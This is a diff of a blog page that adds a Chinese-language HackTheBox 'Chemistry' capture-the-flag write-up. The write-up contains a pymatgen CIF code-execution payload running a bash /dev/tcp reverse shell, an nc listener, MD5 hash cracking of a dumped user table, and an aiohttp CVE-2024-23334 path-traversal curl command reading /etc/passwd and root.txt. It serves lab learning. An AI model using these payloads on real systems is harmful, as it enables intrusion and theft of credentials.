@@ -13,21 +13,47 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://ktkting.github.io/2024/12/16/portswigger/"/>
+    <link rel="canonical" href="https://ktkting.github.io/2024/12/16/chemistry/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta property="og:type" content="article">
-<meta property="og:title" content="PortSwigger">
-<meta property="og:url" content="https://ktkting.github.io/2024/12/16/PortSwigger/index.html">
+        <meta name="description" content="Step 1 - Reconnaissance1sudo nmap -T4 -A 靶機IP  -T4 - 針對 TCP 端口禁止動態掃描延遲超過 10ms-A - 全面系統檢測、啟用腳本檢測、掃描等會發現有一個port為 5000 的網頁    查看此網頁會發現到是一個登入和註冊密碼的網站   點擊 Register 申請一個新帳號   登入後，會如下圖這樣，可以上傳 CIF 檔案點擊一下 her">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chemistry - WriteUp">
+<meta property="og:url" content="https://ktkting.github.io/2024/12/16/Chemistry/index.html">
 <meta property="og:site_name" content="ktkting">
+<meta property="og:description" content="Step 1 - Reconnaissance1sudo nmap -T4 -A 靶機IP  -T4 - 針對 TCP 端口禁止動態掃描延遲超過 10ms-A - 全面系統檢測、啟用腳本檢測、掃描等會發現有一個port為 5000 的網頁    查看此網頁會發現到是一個登入和註冊密碼的網站   點擊 Register 申請一個新帳號   登入後，會如下圖這樣，可以上傳 CIF 檔案點擊一下 her">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-12-16T08:45:45.000Z">
-<meta property="article:modified_time" content="2024-12-16T08:59:19.665Z">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ194toVkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkhm0A24yx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1g3RC3Ekl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJtIJkaNJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sk8SdeaV1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryRwYeaEyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJOAtxaVyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk4k9g6Nkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1coJyTNyl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1y-dKsEJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1c0qFoEkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1Vyiti4ye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJnyiYj41l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJsgitiEyl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkM9jts4Je.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkXMjYjEJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyuSoKsVJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkyQjFj4kg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkVQjFiNJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyeloZTN1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HksXoFsNyl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1umnbaV1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkjEjtsVyl.png">
+<meta property="article:published_time" content="2024-12-16T09:33:37.000Z">
+<meta property="article:modified_time" content="2024-12-16T09:34:17.733Z">
 <meta property="article:author" content="kting">
-<meta property="article:tag" content="PortSwigger">
+<meta property="article:tag" content="HackTheBox">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/BJ194toVkg.png">
     
     
     <!--- Icon Part-->
@@ -39,7 +65,7 @@
     
     <title>
         
-            PortSwigger -
+            Chemistry - WriteUp -
         
         Ktkting&#39;s blog
     </title>
@@ -467,7 +493,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">PortSwigger</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Chemistry - WriteUp</h1>
                 </div>
             
             </div>
@@ -486,15 +512,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-12-16 16:45:45</span>
-        <span class="mobile">2024-12-16 16:45:45</span>
+        <span class="desktop">2024-12-16 17:33:37</span>
+        <span class="mobile">2024-12-16 17:33:37</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-12-16 16:59:19</span>
-            <span class="mobile">2024-12-16 16:59:19</span>
+            <span class="desktop">2024-12-16 17:34:17</span>
+            <span class="mobile">2024-12-16 17:34:17</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -506,7 +532,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/PortSwigger/">PortSwigger</a>&nbsp;
+                        <a href="/tags/HackTheBox/">HackTheBox</a>&nbsp;
                     </li>
                 
             </ul>
@@ -532,25 +558,282 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            
+            <h3 id="Step-1-Reconnaissance"><a href="#Step-1-Reconnaissance" class="headerlink" title="Step 1 - Reconnaissance"></a>Step 1 - Reconnaissance</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -T4 -A 靶機IP</span><br></pre></td></tr></table></figure></div>
+
+<p><code>-T4</code> - 針對 TCP 端口禁止動態掃描延遲超過 10ms<br><code>-A</code> - 全面系統檢測、啟用腳本檢測、掃描等<br>會發現有一個<code>port</code>為 5000 的網頁</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BJ194toVkg.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>查看此網頁會發現到是一個登入和註冊密碼的網站<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rkhm0A24yx.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>點擊 Register 申請一個新帳號<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/H1g3RC3Ekl.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>登入後，會如下圖這樣，可以上傳 CIF 檔案<br>點擊一下 here，會下載一個 example.cif 檔案</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJtIJkaNJx.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>點開 example.cif 檔，如下圖:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/Sk8SdeaV1l.png"
+                      alt="image"
+                ></p>
+<br>
+<br>
+
+<h3 id="Step2-Information-Gathering"><a href="#Step2-Information-Gathering" class="headerlink" title="Step2 - Information Gathering"></a>Step2 - Information Gathering</h3><p>上網搜尋<code>cif cve</code>，查看腳本可以使用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/ryRwYeaEyx.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>點擊第一個網站後，會發現有一個 PoC 的腳本可以使用</p>
+<blockquote>
+<h4 id="PoC-proof-of-concept"><a href="#PoC-proof-of-concept" class="headerlink" title="PoC(proof of concept)"></a>PoC(proof of concept)</h4><p>是為了顯示有漏洞的存在，在未修補前，同時可以做為攻擊者的突破口</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BJOAtxaVyx.png"
+                      alt="image"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/Hk4k9g6Nkl.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>複製 example.cif，到新建一個 cif 檔案，使用 payload 並將<code>system()</code>修改成 Reverse Shell</p>
+<blockquote>
+<h4 id="system"><a href="#system" class="headerlink" title="system()"></a><code>system()</code></h4><p>是 Python 的 <code>os</code> 模組所提供的一個函式，用於在系統層級呼叫 shell 指令。當執行 os.system(“某指令”) 時，Python 會在底層呼叫作業系統的 shell 來執行該指令。執行完成後，<code>system()</code> 會回傳該指令執行完畢時的退出碼 (exit code)。</p>
+</blockquote>
+<blockquote>
+<h4 id="詳細解析如下-ChatGPT-回答-："><a href="#詳細解析如下-ChatGPT-回答-：" class="headerlink" title="詳細解析如下(ChatGPT 回答)："></a>詳細解析如下(ChatGPT 回答)：</h4><p><code>system(&quot;/bin/bash -c &#39; ... &#39;&quot;)</code>：<br>使用 system() 函式呼叫 &#x2F;bin&#x2F;bash，並利用<code> -c</code> 選項執行接在後方的單引號內所包含的指令字串。<br><code>sh -i</code>：<br>啟動一個互動式的 sh 殼層（互動式代表可以透過輸入指令來操作該殼層）。<br><code>&gt;&amp; /dev/tcp/靶機IP/8888</code>：<br>此步驟透過 Bash 的特殊機制，將標準輸出（stdout）和標準錯誤輸出（stderr）重新導向到一個 TCP 連線(&#x2F;dev&#x2F;tcp&#x2F;靶機 IP&#x2F;8888)。<br>簡言之，這會嘗試與「靶機 IP」的「8888」埠建立 TCP 連線，並將所有殼層的執行結果輸出至該連線。<br><code>0&gt;&amp;1</code>：<br>將標準輸入（stdin）重新導向至標準輸出（stdout）。<br>透過前一步驟，我們的 stdout 已經指向遠端的 TCP 連線，因此這一步可以讓遠端的使用者透過該 TCP 連線所傳入的資料變成殼層的輸入，形成一個互動式控制通道。</p>
+</blockquote>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_space_group_magn.transform_BNS_Pp_abc  &#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \&#x27;sh -i &gt;&amp; /dev/tcp/靶機IP/8888 0&gt;&amp;1&#x27;&quot;);0,0,0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_space_group_magn.number_BNS  62.448</span><br><span class="line">_space_group_magn.name_BNS  &quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/H1coJyTNyl.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>上傳新的 cif 檔案</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 8888</span><br></pre></td></tr></table></figure></div>
+
+<p><code>nc</code> - 可以用來檢測伺服器特定的連接埠（port）是否有開啟：<br><code> -n</code> - 直接使用 IP 地址，而不通 e 過 DNS。<br><code>-l</code> - 能轉變成監聽(listen)模式，成為伺服器<br><code>-v</code> - 顯示掃瞄訊息<br><code>-p &lt;通訊端口&gt;</code> - 設置本地主機使用的通訊端口。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/r1y-dKsEJx.png"
+                      alt="image"
+                ></p>
+<br>
+<br>
+
+<h3 id="Step3-Lateral-Movement"><a href="#Step3-Lateral-Movement" class="headerlink" title="Step3 - Lateral Movement"></a>Step3 - Lateral Movement</h3><p><code>ls -la</code> - 列出靶機上目前有哪些目錄及檔案，會發現有一個名為<code>instance</code>的檔案<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/S1c0qFoEkg.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>進一步查看此檔案，又會發現到有一個<code>database.db</code>檔案<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/S1Vyiti4ye.png"
+                      alt="image"
+                ></p>
+<br>
+
+<blockquote>
+<h4 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h4><p>是一種輕量級、獨立且無伺服器的關聯式資料庫管理系統（RDBMS），被廣泛用於嵌入式系統、行動應用程式和中小型網站。它易於安裝，需要較少的配置，並提供了一組用於管理和操作資料的強大功能。</p>
+</blockquote>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 database.db</span><br><span class="line">.table</span><br></pre></td></tr></table></figure></div>
+
+<p><code>.table</code> - 查詢當前 db 的 table</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJnyiYj41l.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p><code>select * from user;</code> - 查詢<code>user</code>資料表內所有的資料</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BJsgitiEyl.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>到<a class="link"   target="_blank" rel="noopener" href="https://crackstation.net/" >CrackStation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>去把 MD5 Hash 密碼進行解碼<br><code>rose</code>的密碼可以解出來</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SkM9jts4Je.png"
+                      alt="image"
+                ></p>
+<br>
+
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh rose@靶機IP</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rkXMjYjEJl.png"
+                      alt="image"
+                ></p>
+<br>
+
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SyuSoKsVJe.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>查看目前有哪些檔案</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rkyQjFj4kg.png"
+                      alt="image"
+                ></p>
+<br>
+
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HkVQjFiNJe.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>查看目前靶機網路連線情況</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -ant</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SyeloZTN1g.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>查看目前伺服器的資料，確認此伺服器正運行在<code>aiohttp/3.9.1</code></p>
+<blockquote>
+<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>是一款藉由指定的網路協定，以指令&#x2F;命令列方式來進行檔案傳輸的免費開源工具，最常使用它來測試網站 Web 的資訊傳輸、測試 API 是否可以正常運作等</p>
+</blockquote>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl localhost@8080 --head</span><br></pre></td></tr></table></figure></div>
+
+<p><code>-I</code>, <code>–head</code> - 只取得(顯示)連線的 Header 資料</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HksXoFsNyl.png"
+                      alt="image"
+                ></p>
+<br>
+
+<p>上網搜尋<code>aiohttp/3.9.1</code>是否有漏洞，會發現它是一個<code>CVE-2024-23334</code></p>
+<blockquote>
+<h4 id="CVE-2024-23334"><a href="#CVE-2024-23334" class="headerlink" title="CVE-2024-23334"></a>CVE-2024-23334</h4><p>是在 aiohttp 函式庫中，發現此漏洞造成目錄遍歷攻擊的風險，特別是當 aiohttp 被用作網頁伺服器，且在設定靜態路由時未採取適當的安全防護措施時。</p>
+</blockquote>
+<blockquote>
+<h4 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title="Path Traversal"></a>Path Traversal</h4><p>是一種透過控制檔案變數來存取儲存在 Web 根目錄之外的檔案和目錄的攻擊。</p>
+</blockquote>
+<blockquote>
+<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>可以利用伺服器上的靜態目錄作為端點，透過<code>curl</code>發送請求及目錄遍歷的方式，最終讀取我想要看的檔案<br>範例: <code>curl -s --path-as-is &quot;http://localhost:8081/static/../../../../../etc/passwd&quot;</code></p>
+</blockquote>
+<br>
+
+<p>查看<code>http://localhost:8080</code>的<code>source code</code>，會發現有一個靜態目錄名為<code>/assets</code></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:8080</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/B1umnbaV1l.png"
+                      alt="image"
+                ></p>
+<br>
+
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s --path-as-is http://localhost:8080/assets/../../../../../root/root.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rkjEjtsVyl.png"
+                      alt="image"
+                ></p>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://medium.com/@Vishal17/chemistry-htb-writeup-1647773e4280" >Chemistry HTB (writeup) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f" >Arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>\</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.techtarget.com/searchsecurity/definition/proof-of-concept-PoC-exploit" >proof of concept (PoC) exploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hackmd.io/@Not/nmapparameter" >Nmap 常用參數 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://ericbbs.blogspot.com/2007/11/linux-nc.html" >nc 指令 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://medium.com/@bondemit/sqlite3-%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4-ac7bbc567ec4" >SQLite3—基本指令 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.jinnsblog.com/2022/12/linux-curl-data-transfer-tutorial.html" >curl 指令 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0" >CVE-2024-23334 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+
         </div>
 
         
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> PortSwigger</li>
+        <li><strong>Title:</strong> Chemistry - WriteUp</li>
         <li><strong>Author:</strong> kting</li>
         <li><strong>Created at
-                :</strong> 2024-12-16 16:45:45</li>
+                :</strong> 2024-12-16 17:33:37</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-12-16 16:59:19
+                    :</strong> 2024-12-16 17:34:17
             </li>
         
         <li>
-            <strong>Link:</strong> https://redefine.ohevan.com/2024/12/16/PortSwigger/
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/12/16/Chemistry/
         </li>
         <li>
             <strong>
@@ -572,7 +855,7 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/PortSwigger/">#PortSwigger</a>&nbsp;
+                        <a href="/tags/HackTheBox/">#HackTheBox</a>&nbsp;
                     </li>
                 
             </ul>
@@ -583,29 +866,14 @@
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/12/16/Kioptrix-level-1/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Kioptrix:level 1 - WriteUp</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/12/16/HackTheBox/"
+                        href="/2024/12/16/Tr0ll-1/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">HackTheBox</span>
+                                <span class="post-nav-title-item">Tr0ll 1 - WriteUp</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -626,8 +894,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">PortSwigger</div>
-        
+        <div class="page-title">Chemistry - WriteUp</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-1-Reconnaissance"><span class="nav-text">Step 1 - Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step2-Information-Gathering"><span class="nav-text">Step2 - Information Gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step3-Lateral-Movement"><span class="nav-text">Step3 - Lateral Movement</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-text">References</span></a></li></ol>
 
     </div>
 </div>
